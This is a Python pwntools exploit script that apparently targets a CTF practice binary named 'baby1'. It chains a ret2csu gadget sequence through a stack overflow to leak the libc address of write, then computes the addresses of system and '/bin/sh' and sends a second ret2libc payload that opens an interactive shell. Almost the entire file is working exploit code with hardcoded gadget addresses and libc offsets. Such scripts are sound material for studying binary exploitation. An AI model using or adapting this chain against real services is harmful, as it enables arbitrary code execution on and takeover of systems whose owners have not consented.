#author : Anis_Boss
#technique : ret2csu
from pwn import *

elf = ELF('./baby1')

main = elf.symbols['main']
write_plt = elf.symbols['write']
write_got = elf.got['write']
pop_rdi = 0x00000000004006c3  #pop rdi ; ret ;
pop_all = 0x00000000004006ba ##pop rbx;pop rbp;r12-r15;
write_off = 0x00000000000f72b0 #write offset after identifying libc version 
system_off = 0x0000000000045390 #system offset

#control rdx register through ret2csu
payload = ""
payload += "A"*56
payload += p64(pop_all)
payload += p64(0x0) #rbx
payload += p64(0x1) # rbp = 1
payload += p64(0x600e50) # _fini r12
payload += p64(0x8) #r13; 0 3rd argument to write
payload += p64(write_got) #r14;rsi 2nd argument to write
payload += p64(0x1) #edi ; part of 1st argument
payload += p64(0x4006a0) #mov rdx,r13 ; ajust registers
payload += p64(0xdeadbeef) ##lots of pop
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi) #fix 1 (fd : stdout) in rdi only edi was written
payload += p64(0x1)
payload += p64(write_plt)
payload += p64(main)

p = process('./baby1')
print p.recv(1024)

p.sendline(payload)
data = p.recv(8)
write_libc = u64(data.ljust(8,'\x00'))
print "write_libc : ",hex(write_libc)
libc_base = write_libc - write_off
print "libc_base : ",hex(libc_base)
system_libc = libc_base + system_off
print "system_libc : ",hex(system_libc)
bin_sh_libc = system_libc + 0x1479c7

#stage 2 ret2libc
payload = ""
payload = "A"*56
payload += p64(pop_rdi)
payload += p64(bin_sh_libc)
payload += p64(system_libc)
p.sendline(payload)
p.interactive()

